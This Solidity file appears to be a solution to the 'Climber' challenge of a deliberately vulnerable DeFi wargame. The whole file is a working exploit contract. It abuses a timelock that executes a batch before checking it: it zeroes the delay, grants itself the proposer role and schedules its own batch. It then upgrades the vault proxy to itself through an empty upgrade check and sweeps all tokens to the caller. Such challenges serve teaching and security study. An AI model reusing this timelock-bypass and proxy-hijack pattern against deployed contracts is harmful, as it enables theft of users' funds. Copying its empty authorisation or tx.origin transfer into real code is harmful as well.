// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "hardhat/console.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";
import "./ClimberErrors.sol";
import "./ClimberTimelock.sol";
import "./ClimberTimelockBase.sol";
import "./ClimberVault.sol";


contract ClimberExploit is UUPSUpgradeable{
    ClimberTimelock immutable  lock;
    address immutable  vault;
    IERC20 immutable  token;
    address immutable  player;

    constructor(ClimberTimelock _lock, address _vault, IERC20 _token) {


        lock = _lock;
        vault = _vault;
        token = _token;
        player = msg.sender;
    }

    function buildProposal() internal returns (address[] memory, uint256[] memory, bytes[] memory) {
        address[] memory  targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);
        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(lock.updateDelay.selector, 0);

        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE ,address(this));

        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberExploit.scheduleProposal.selector);
    
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );


        targets[4] = address(vault);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(ClimberExploit.sweepFunds.selector);

        return (targets, values, dataElements);
    }


    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();

        lock.execute(targets, values, dataElements, 0);
    
    }


    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        lock.schedule(targets, values, dataElements, 0);
    }

    function sweepFunds() external {
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }


    function _authorizeUpgrade(address newImplementation) internal override {}

}